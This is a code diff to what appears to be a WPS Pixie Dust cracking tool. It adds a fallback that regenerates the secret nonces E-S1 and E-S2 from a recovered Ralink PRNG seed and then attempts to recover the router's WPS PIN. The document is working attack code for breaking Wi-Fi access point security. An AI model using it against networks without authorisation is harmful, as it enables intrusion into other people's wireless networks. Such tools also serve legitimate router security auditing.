@@ -1182,10 +1182,30 @@ usage_err:
 						DEBUG_PRINT("Pin found (%8s)", wps->pin);
 					}
 					else {
-						wps->nonce_match = RT;
-						wps->nonce_seed = 0;
-						wps->s1_seed = 0;
-						wps->s2_seed = 0;
+						/* Some firmware redraws E-S1/E-S2 after E-Nonce.
+						 * Observed on an Askey router using a Ralink RT2860 chipset. */
+						prng.sreg = wps->nonce_seed;
+						for (int i = 0; i < WPS_NONCE_LEN; i++)
+							(void)ralink_randbyte(&prng);
+						wps->s1_seed = prng.sreg;
+						for (int i = 0; i < WPS_SECRET_NONCE_LEN; i++)
+							wps->e_s1[i] = ralink_randbyte(&prng);
+						wps->s2_seed = prng.sreg;
+						for (int i = 0; i < WPS_SECRET_NONCE_LEN; i++)
+							wps->e_s2[i] = ralink_randbyte(&prng);
+
+						DEBUG_PRINT("Trying forward E-S1/E-S2");
+						DEBUG_PRINT_ATTEMPT(wps->e_s1, wps->e_s2);
+						if (crack(wps, wps->pin) == PIN_FOUND) {
+							found_p_mode = RT;
+							DEBUG_PRINT("Pin found (%8s)", wps->pin);
+						}
+						else {
+							wps->nonce_match = RT;
+							wps->nonce_seed = 0;
+							wps->s1_seed = 0;
+							wps->s2_seed = 0;
+						}
 					}
 				}
 				else {
